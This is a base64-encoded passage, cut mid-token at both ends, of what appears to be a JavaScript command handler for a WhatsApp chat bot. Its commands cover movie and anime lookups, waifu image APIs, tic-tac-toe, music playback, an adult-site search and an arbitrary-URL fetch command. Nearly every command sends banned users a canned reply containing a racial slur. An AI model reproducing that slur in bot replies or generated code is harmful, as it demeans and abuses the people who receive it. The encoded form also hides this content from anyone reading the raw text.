J0ICs9ICLwn4yAR2VucmUgICAgICA6ICIgKyBmaWRzLmRhdGEuR2VucmUgKyAiXG4iCiAgICAgICAgICAgIGltZGJ0ICs9ICLwn5Go8J+Pu+KAjfCfkrtEaXJlY3RvciAgIDogIiArIGZpZHMuZGF0YS5EaXJlY3RvciArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIuKcjVdyaXRlciAgICAgOiAiICsgZmlkcy5kYXRhLldyaXRlciArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfkahBY3RvcnMgICAgIDogIiArIGZpZHMuZGF0YS5BY3RvcnMgKyAiXG4iCiAgICAgICAgICAgIGltZGJ0ICs9ICLwn5ODUGxvdCAgICAgICA6ICIgKyBmaWRzLmRhdGEuUGxvdCArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfjJBMYW5ndWFnZSAgIDogIiArIGZpZHMuZGF0YS5MYW5ndWFnZSArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfjI1Db3VudHJ5ICAgIDogIiArIGZpZHMuZGF0YS5Db3VudHJ5ICsgIlxuIgogICAgICAgICAgICBpbWRidCArPSAi8J+Olu+4j0F3YXJkcyAgICAgOiAiICsgZmlkcy5kYXRhLkF3YXJkcyArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfk6ZCb3hPZmZpY2UgIDogIiArIGZpZHMuZGF0YS5Cb3hPZmZpY2UgKyAiXG4iCiAgICAgICAgICAgIGltZGJ0ICs9ICLwn4+Z77iPUHJvZHVjdGlvbiA6ICIgKyBmaWRzLmRhdGEuUHJvZHVjdGlvbiArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfjJ9pbWRiUmF0aW5nIDogIiArIGZpZHMuZGF0YS5pbWRiUmF0aW5nICsgIlxuIgogICAgICAgICAgICBpbWRidCArPSAi4pyFaW1kYlZvdGVzICA6ICIgKyBmaWRzLmRhdGEuaW1kYlZvdGVzICsgIiIKICAgICAgICAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewppbWFnZTogewp1cmw6IGZpZHMuZGF0YS5Qb3N0ZXIsCn0sCmNhcHRpb246IGltZGJ0LAogICAgICAgICAgICB9LCB7CnF1b3RlZDogbSwKICAgICAgICAgICAgfSkKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ3Rpa3Rva3NlYXJjaCc6CmNhc2UgJ3R0c2VhcmNoJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGNvbnN0IGRhbm4gPSByZXF1aXJlKCdkLXNjcmFwZScpCmlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGAgY2luZGlnbyBgKQphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3JlYWN0OiB7dGV4dDogJ/CfgIQnLCBrZXk6IG0ua2V5fX0pCnRyeSB7CmxldCBhbnUgPSBhd2FpdCBkYW5uLnNlYXJjaC50aWt0b2tzKHRleHQpCnJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IHZpZGVvOiB7IHVybDogYW51Lm5vX3dhdGVybWFyayB9LCBtaW1ldHlwZTogJ3ZpZGVvL21wNCcsIGNhcHRpb246IGFudS50aXRsZSB9LCB7IHF1b3RlZCA6IG0gfSkKfSBjYXRjaCAoZXJyb3IpIHsKbS5yZXBseSgnRXJyb3IgOiBjYW5ub3QgZmV0Y2ggZnJvbSBxdWVyeScpCn0KfQpicmVhazsKICAgICAgICAgICAgICBjYXNlICdhbmltZWF2YXRhcic6IHsKICAgICAgICAgICAgICBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vbmVrb3MubGlmZS9hcGkvdjIvaW1nL2F2YXRhcmApICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHtpbWFnZToge3VybDp3YWlmdWRkLmRhdGEudXJsfSwgY2FwdGlvbjogbS5zdWNjZXNzfSx7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuKCdFcnJvciEnKQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KYnJlYWs7Ci8vZ2FtZQogICAgICAgICAgICBjYXNlICd0dGMnOgogICAgICAgICAgICBjYXNlICd0dHQnOgogICAgICAgICAgICBjYXNlICd0aWN0YWN0b2UnOiB7CiAgICAgICAgICAgIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgICAgICAgICAgICAgbGV0IFRpY1RhY1RvZSA9IHJlcXVpcmUoIi4vbGliL3RpY3RhY3RvZSIpCiAgICAgICAgICAgICAgICB0aGlzLmdhbWUgPSB0aGlzLmdhbWUgPyB0aGlzLmdhbWUgOiB7fQogICAgICAgICAgICAgICAgaWYgKE9iamVjdC52YWx1ZXModGhpcy5nYW1lKS5maW5kKHJvb20gPT4gcm9vbS5pZC5zdGFydHNXaXRoKCd0aWN0YWN0b2UnKSAmJiBbcm9vbS5nYW1lLnBsYXllclgsIHJvb20uZ2FtZS5wbGF5ZXJPXS5pbmNsdWRlcyhtLnNlbmRlcikpKSByZXR1cm4gcmVwbHkoJ1lvdSBhcmUgc3RpbGwgaW4gdGhlIGdhbWUnKQogICAgICAgICAgICAgICAgbGV0IHJvb20gPSBPYmplY3QudmFsdWVzKHRoaXMuZ2FtZSkuZmluZChyb29tID0+IHJvb20uc3RhdGUgPT09ICdXQUlUSU5HJyAmJiAodGV4dCA/IHJvb20ubmFtZSA9PT0gdGV4dCA6IHRydWUpKQogICAgICAgICAgICAgICAgaWYgKHJvb20pIHsKICAgICAgICAgICAgICAgICAgICByZXBseSgnUGFydG5lciBub3QgZm91bmQhJykKICAgICAgICAgICAgICAgICAgICByb29tLm8gPSBtLmNoYXQKICAgICAgICAgICAgICAgICAgICByb29tLmdhbWUucGxheWVyTyA9IG0uc2VuZGVyCiAgICAgICAgICAgICAgICAgICAgcm9vbS5zdGF0ZSA9ICdQTEFZSU5HJwogICAgICAgICAgICAgICAgICAgIGxldCBhcnIgPSByb29tLmdhbWUucmVuZGVyKCkubWFwKHYgPT4gewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgWDogJ+KdjCcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPOiAn4q2VJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE6ICcx77iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDI6ICcy77iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDM6ICcz77iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ6ICc077iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU6ICc177iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDY6ICc277iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDc6ICc377iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDg6ICc477iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDk6ICc577iP4oOjJywKICAgICAgICAgICAgICAgICAgICAgICAgfSBbdl0KICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGxldCBzdHIgPSBgUm9vbSBJRDogJHtyb29tLmlkfQoKJHthcnIuc2xpY2UoMCwgMykuam9pbignJyl9CiR7YXJyLnNsaWNlKDMsIDYpLmpvaW4oJycpfQoke2Fyci5zbGljZSg2KS5qb2luKCcnKX0KCldhaXQgQCR7cm9vbS5nYW1lLmN1cnJlbnRUdXJuLnNwbGl0KCdAJylbMF19CgpUeXBlICpzdXJyZW5kZXIqIHRvIGdpdmUgdXAgYW5kIGFkbWl0IGRlZmVhdGAKICAgICAgICAgICAgICAgICAgICBpZiAocm9vbS54ICE9PSByb29tLm8pIGF3YWl0IHJpY2guc2VuZFRleHQocm9vbS54LCBzdHIsIG0sIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWVudGlvbnM6IHBhcnNlTWVudGlvbihzdHIpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRUZXh0KHJvb20ubywgc3RyLCBtLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnRpb25zOiBwYXJzZU1lbnRpb24oc3RyKQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJvb20gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiAndGljdGFjdG9lLScgKyAoK25ldyBEYXRlKSwKICAgICAgICAgICAgICAgICAgICAgICAgeDogbS5jaGF0LAogICAgICAgICAgICAgICAgICAgICAgICBvOiAnJywKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTogbmV3IFRpY1RhY1RvZShtLnNlbmRlciwgJ28nKSwKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGU6ICdXQUlUSU5HJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAodGV4dCkgcm9vbS5uYW1lID0gdGV4dAogICAgICAgICAgICAgICAgICAgIHJlcGx5KCdXYWl0aW5nIGZvciBwYXJ0bmVyIHR5cGUgLnRpY3RhY3RvZSB0byBqb2luJyArICh0ZXh0ID8gYCB0eXBlIHRoZSBjb21tYW5kIGJlbG93ICR7cHJlZml4fSR7Y29tbWFuZH0gJHt0ZXh0fWAgOiAnJykpCiAgICAgICAgICAgICAgICAgICAgdGhpcy5nYW1lW3Jvb20uaWRdID0gcm9vbQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdkZWx0dGMnOgogICAgICAgICAgICBjYXNlICdkZWx0dHQnOiB7CiAgICAgICAgICAgIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgICAgICAgICAgICAgdGhpcy5nYW1lID0gdGhpcy5nYW1lID8gdGhpcy5nYW1lIDoge30KICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRoaXMuZ2FtZSkgewogICAgICAgICAgICAgICAgICAgICAgICBkZWxldGUgdGhpcy5nYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIHJpY2guc2VuZFRleHQobS5jaGF0LCBgU3VjY2Vzc2Z1bGx5IGRlbGV0ZSBUaWNUYWNUb2Ugc2Vzc2lvbmAsIG0pCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICghdGhpcy5nYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGx5KGBTZXNzaW9uIFRpY1RhY1RvZfCfjq4gU2Vzc2lvbiBpcyBtaXNzaW5nYCkKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgcmVwbHkoJz8nKQogICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgIHJlcGx5KCdlcnJvcicpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2NsZWFyJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKcmljaC5jaGF0TW9kaWZ5KHsgZGVsZXRlOiB0cnVlLCBsYXN0TWVzc2FnZXM6IFt7IGtleTogbS5rZXksIG1lc3NhZ2VUaW1lc3RhbXA6IG0ubWVzc2FnZVRpbWVzdGFtcCB9XSB9LCBtLmNoYXQpCn0KYnJlYWs7CmNhc2UgJ2dldDInOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICAgICAgaWYgKCEvXmh0dHBzPzpcL1wvLy50ZXN0KHRleHQpKSByZXR1cm4gcmVwbHkoYGV4IDogJHtwcmVmaXggKyBjb21tYW5kfSBodHRwczovL2ApOwogICAgICAgIGNvbnN0IGFqZyA9IGF3YWl0IGZldGNoKHRleHQpOwogICAgICAgICAgYXdhaXQgcmVhY3Rpb24obS5jaGF0LCAi8J+AhCIpCiAgICAgICAgaWYgKGFqZy5oZWFkZXJzLmdldCgiY29udGVudC1sZW5ndGgiKSA+IDEwMCAqIDEwMjQgKiAxMDI0KSB7CiAgICAgICAgICAgIHRocm93IGBDb250ZW50LUxlbmd0aDogJHthamcuaGVhZGVycy5nZXQoImNvbnRlbnQtbGVuZ3RoIil9YDsKICAgICAgICB9CgogICAgICAgIGNvbnN0IGNvbnRlbnRUeXBlID0gYWpnLmhlYWRlcnMuZ2V0KCJjb250ZW50LXR5cGUiKTsKICAgICAgICBpZiAoY29udGVudFR5cGUuc3RhcnRzV2l0aCgiaW1hZ2UvIikpIHsKICAgICAgICAgICAgcmV0dXJuIHJpY2guc2VuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICBtLmNoYXQsCiAgICAgICAgICAgICAgICB7IGltYWdlOiB7IHVybDogdGV4dCB9IH0sCiAgICAgICAgICAgICAgICB7IHF1b3RlZDogZ2x4TnVsbCB9CiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIGlmIChjb250ZW50VHlwZS5zdGFydHNXaXRoKCJ2aWRlby8iKSkgewogICAgICAgICAgICByZXR1cm4gY29ubi5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgICAgIG0uY2hhdCwKICAgICAgICAgICAgICAgIHsgdmlkZW86IHsgdXJsOiB0ZXh0IH0gfSwKICAgICAgICAgICAgICAgIHsgcXVvdGVkOiBnbHhOdWxsICB9CiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIGlmIChjb250ZW50VHlwZS5zdGFydHNXaXRoKCJhdWRpby8iKSkgewogICAgICAgICAgICByZXR1cm4gcmljaC5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgICAgIG0uY2hhdCwKICAgICAgICAgICAgICAgIHsgYXVkaW86IHsgdXJsOiB0ZXh0IH0sCiAgICAgICAgICAgICAgICBtaW1ldHlwZTogJ2F1ZGlvL21wZWcnLCAKICAgICAgICAgICAgICAgIHB0dDogdHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsgcXVvdGVkOiBnbHhOdWxsIH0KICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgbGV0IGFsYWsgPSBhd2FpdCBhamcuYnVmZmVyKCk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgYWxhayA9IHV0aWwuZm9ybWF0KEpTT04ucGFyc2UoYWxhayArICIiKSk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICBhbGFrID0gYWxhayArICIiOwogICAgICAgIH0gZmluYWxseSB7CiAgICAgICAgICAgIHJldHVybiByZXBseShhbGFrLnNsaWNlKDAsIDY1NTM2KSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIGJyZWFrOwpjYXNlICd4bnh4c2VhcmNoJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKCWlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBFbnRlciBRdWVyeWApCglyZXBseShtZXNzLndhaXQpCgljb25zdCBmZyA9IHJlcXVpcmUoJ2FwaS1keWx1eCcpCglsZXQgcmVzID0gYXdhaXQgZmcueG54eFNlYXJjaCh0ZXh0KQogICAgICAgICAgICBsZXQgZmYgPSByZXMucmVzdWx0Lm1hcCgodiwgaSkgPT4gYCR7aSArIDF94pSDICpUaXRsZSogOiAke3YudGl0bGV9XG4qTGluazoqICR7di5saW5rfVxuYCkuam9pbignXG4nKSAKICAgICAgICAgICAgICBpZiAocmVzLnN0YXR1cykgcmVwbHkoZmYpCiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgIGNhc2UgInBsYXkiOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIXRleHQpIHJldHVybiBtLnJlcGx5KGV4YW1wbGUoInBhc3QgbGl2ZXMiKSkKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHtyZWFjdDoge3RleHQ6ICfwn4CEJywga2V5OiBtLmtleX19KQpsZXQgeXRzU2VhcmNoID0gYXdhaXQgeXRzKHRleHQpCmNvbnN0IHJlcyA9IGF3YWl0IHl0c1NlYXJjaC5hbGxbMF0KCnZhciBhbnUgPSBhd2FpdCB5dGRsLnl0bXAzKGAke3Jlcy51cmx9YCkKCmlmIChhbnUuc3RhdHVzKSB7CmxldCB1cmxNcDMgPSBhbnUuZG93bmxvYWQudXJsCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7YXVkaW86IHt1cmw6IHVybE1wM30sIG1pbWV0eXBlOiAiYXVkaW8vbXBlZyIsIGNvbnRleHRJbmZvOiB7IGV4dGVybmFsQWRSZXBseToge3RodW1ibmFpbFVybDogcmVzLnRodW1ibmFpbCwgdGl0bGU6IHJlcy50aXRsZSwgYm9keTogYEF1dGhvciAke3Jlcy5hdXRob3IubmFtZX0gfHwgRHVyYXRpb24gJHtyZXMudGltZXN0YW1wfWAsIHNvdXJjZVVybDogcmVzLnVybCwgcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlLCBtZWRpYVR5cGU6IDF9fX0sIHtxdW90ZWQ6IG19KQphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3JlYWN0OiB7dGV4dDogJycsIGtleTogbS5rZXl9fSkKfSBlbHNlIHsKcmV0dXJuIG0ucmVwbHkoIkVycm9yISBSZXN1bHQgTm90IEZvdW5kIikKfQp9CmJyZWFrOwpjYXNlICdhbmltZXNlYXJjaCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBXaGljaCBhbmltZSBhcmUgeW91IGxvb2tpbiBmb3I/YCkKY29uc3QgbWFsU2NyYXBlciA9IHJlcXVpcmUoJ21hbC1zY3JhcGVyJykKICAgICAgICBjb25zdCBhbmltZSA9IGF3YWl0IG1hbFNjcmFwZXIuZ2V0SW5mb0Zyb21OYW1lKHRleHQpLmNhdGNoKCgpID0+IG51bGwpCiAgICAgICAgaWYgKCFhbmltZSkgcmV0dXJuIHJlcGx5KGBDb3VsZCBub3QgZmluZGApCmxldCBhbmltZXR4dCA9IGAK8J+OgCAqVGl0bGU6ICR7YW5pbWUudGl0bGV9Kgrwn46LICpUeXBlOiAke2FuaW1lLnR5cGV9Kgrwn46QICpQcmVtaWVyZWQgb246ICR7YW5pbWUucHJlbWllcmVkfSoK8J+SoCAqVG90YWwgRXBpc29kZXM6ICR7YW5pbWUuZXBpc29kZXN9Kgrwn5OIICpTdGF0dXM6ICR7YW5pbWUuc3RhdHVzfSoK8J+SriAqR2VucmVzOiAke2FuaW1lLmdlbnJlc30K8J+TjSAqU3R1ZGlvOiAke2FuaW1lLnN0dWRpb3N9Kgrwn4yfICpTY29yZTogJHthbmltZS5zY29yZX0qCvCfko4gKlJhdGluZzogJHthbmltZS5yYXRpbmd9Kgrwn4+FICpSYW5rOiAke2FuaW1lLnJhbmtlZH0qCvCfkqsgKlBvcHVsYXJpdHk6ICR7YW5pbWUucG9wdWxhcml0eX0qCuKZpu+4jyAqVHJhaWxlcjogJHthbmltZS50cmFpbGVyfSoK8J+MkCAqVVJMOiAke2FuaW1lLnVybH0qCuKdhCAqRGVzY3JpcHRpb246KiAke2FuaW1lLnN5bm9wc2lzfSpgCiAgICAgICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCx7aW1hZ2U6e3VybDphbmltZS5waWN0dXJlfSwgY2FwdGlvbjphbmltZXR4dH0se3F1b3RlZDptfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGNhc2UgJ2FuaW1laGlnaGZpdmUnOnsKICAgICAgICAgICAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9oaWdoZml2ZWApICAgICAgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6d2FpZnVkZC5kYXRhLnVybH0gLCBjYXB0aW9uOiBtLnN1Y2Nlc3N9LCB7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CnJldHVybignRXJyb3IhJykKfSkKfQpicmVhazsKY2FzZSAnYW5pbWVjcmluZ2UnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9jcmluZ2VgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1lZGFuY2UnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnJlcGx5KG1lc3Mud2FpdCkKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L2RhbmNlYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZWhhcHB5Jzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogd2FpZnVkZCA9IGF3YWl0IGF4aW9zLmdldChgaHR0cHM6Ly93YWlmdS5waWNzL2FwaS9zZncvaGFwcHlgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1lZ2xvbXAnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9nbG9tcGApICAgICAgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6d2FpZnVkZC5kYXRhLnVybH0gLCBjYXB0aW9uOiBtLnN1Y2Nlc3N9LCB7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CnJldHVybignRXJyb3IhJykKfSkKfQpicmVhazsKY2FzZSAnYW5pbWVzbXVnJzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwpyZXBseShtZXNzLndhaXQpCiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9zbXVnYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZWJsdXNoJzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwpyZXBseShtZXNzLndhaXQpCiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9ibHVzaGApICAgICAgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6d2FpZnVkZC5kYXRhLnVybH0gLCBjYXB0aW9uOiBtLnN1Y2Nlc3N9LCB7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CnJldHVybignRXJyb3IhJykKfSkKfQpicmVhazsKY2FzZSAnbGlzdG9ubGluZSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CiAgICAgICAgaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseShtZXNzLmdyb3Vwb25seSk7CiAgICAgICAgcmljaC5zZW5kTWVzc2FnZShmcm9tLCB7IHJlYWN0OiB7IHRleHQ6ICLwn4CEIiwga2V5OiBtLmtleSB9IH0pCiAgICAgICAgbGV0IGlkID0gYXJncyAmJiAvXGQrXC1cZCtAZy51cy8udGVzdChhcmdzWzBdKSA/IGFyZ3NbMF0gOiBtLmNoYXQKICAgICAgICBsZXQgb25saW5lID0gWy4uLk9iamVjdC5rZXlzKHN0b3JlLnByZXNlbmNlc1tpZF0pLCBib3ROdW1iZXJdCiAgICAgICAgbGV0IGxpc3RvbiA9IDEKICAgICAgICByaWNoLnNlbmRUZXh0KG0uY2hhdCwgJyDjgIxgYGBPbmxpbmUgTWVtYmVyc2BgYOOAjVxuXG4nICsgb25saW5lLm1hcCh2ID0+IGAke2xpc3RvbisrfSAuIEBgICsgdi5yZXBsYWNlKC9ALisvLCAnJykpLmpvaW5gXG5gLCBtLCB7IG1lbnRpb25zOiBvbmxpbmUgfSkKICAgICAgfQogICAgICBicmVhazsKY2FzZSAnYW5pbWV3YXZlJzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogd2FpZnVkZCA9IGF3YWl0IGF4aW9zLmdldChgaHR0cHM6Ly93YWlmdS5waWNzL2FwaS9zZncvd2F2ZWApICAgICAgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6d2FpZnVkZC5kYXRhLnVybH0gLCBjYXB0aW9uOiBtLnN1Y2Nlc3N9LCB7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CnJldHVybignRXJyb3IhJykKfSkKfQpicmVhazsKY2FzZSAnYW5pbWVzbWlsZSc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPV